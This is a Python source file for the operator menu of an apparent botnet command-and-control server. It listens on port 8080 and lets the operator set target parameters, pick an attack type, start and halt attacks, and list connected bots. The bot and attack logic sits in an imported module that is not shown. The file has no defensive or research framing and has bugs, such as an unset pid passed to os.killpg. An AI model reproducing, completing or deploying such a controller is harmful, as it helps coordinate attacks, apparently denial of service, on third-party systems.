import os
import sys
import socket
import signal
import threading

from server import Server

pid = -1
server_started = False
server_fd = None
# ip = socket.gethostbyname(socket.gethostname())
host = socket.gethostname()
server_address = (host, 8080)
attacking = False


def start_server():
    global server_started, server_fd, pid, server_address
    
    if not server_started:
        server_started = True
        opt = 1
        addrlen = len(server_address)
        buffer = bytearray(1024)
        hello = "Hello from server"
        
        # create socket file descriptor
        try:
            server_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as err:
            print(f"Socket fialed: {err}")
            sys.exit(1)
        
        # forcefully attaching socket to the port specified
        try:
            server_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR | socket.SO_REUSEPORT, opt)
        except socket.error as err:
            print(f"Setsockopt failed: {err}")
            sys.exit(1)
        
        server_address = ("0.0.0.0", 8080)
        
        # bind address and port to the socket
        try:
            server_fd.bind(server_address)
        except socket.error as err:
            print(f"Bind failed: {err}")
            sys.exit(1)
        
        # wait for client to connect
        try:
            server_fd.listen(10)
        except socket.error as err:
            print(f"Listen failed: {err}")
            sys.exit(1)
        
        server_instance = Server(server_fd)
        tListener = threading.Thread(target=server_instance.connection_listener, args = (1, ))
        tListener.daemon = True
        tListener.start()
    
    int_choice = 0
    
    while int_choice != 6 and int_choice != 7:
        os.system("clear")
        
        print("Server started.")
        print("Server options:")
        print("1. setup target parameters")
        print("2. setup attack type")
        print("3. Start attack")
        print("4. halt attack")
        print("5. list connected bots")
        print("6. shutdown server")
        print("7. exit")
        print(server_instance.server_status())
        
        choice = input("Enter your choice: ")
        try:
            int_choice = int(choice)
        except ValueError:
            print("Invalid choice. Please enter a number.")
        
        if int_choice == 1:
            server_instance.setup_target_parameters()
        elif int_choice == 2:
            server_instance.setup_attack_type()
        elif int_choice == 3:
            server_instance.start_attack()
            server_instance.attacking = True
        elif int_choice == 4:
            server_instance.attack = "HALT"
            server_instance.start_attack()
            server_instance.attacking = False
        elif int_choice == 5:
            server_instance.list_bots()
        elif int_choice == 6:
            os.killpg(pid, signal.SIGKILL)
            server_instance.close_connected_sockets()
            server_fd.shutdown(socket.SHUT_RDWR)
        elif int_choice == 7:
            break
        else:
            print("Invalid choice. Please enter a valid choice.")
    
def main_menu():
    int_choice = 0
    while int_choice != 2:
        os.system("clear")
        
        print("Menu selection:")
        print("1. Start server")
        print("2. Exit")
        
        choice = input("Enter your choice: ")
        try:
            int_choice = int(choice)
        except ValueError:
            print("Invalid choice. Please enter a number.")
        
        if int_choice == 1:
            start_server()
        elif int_choice == 2:
            break
        else:
            print("Invalid choice. Please enter a valid choice.")

def signal_callback_handler(signum, frame):
    if pid > 0:
        os.killpg(pid, signal.SIGKILL)
    sys.exit(signum)
    
def main():
    signal.signal(signal.SIGINT, signal_callback_handler)
    main_menu()
    if pid > 0:
        os.killpg(pid, signal.SIGKILL)

if __name__ == "__main__":
    main()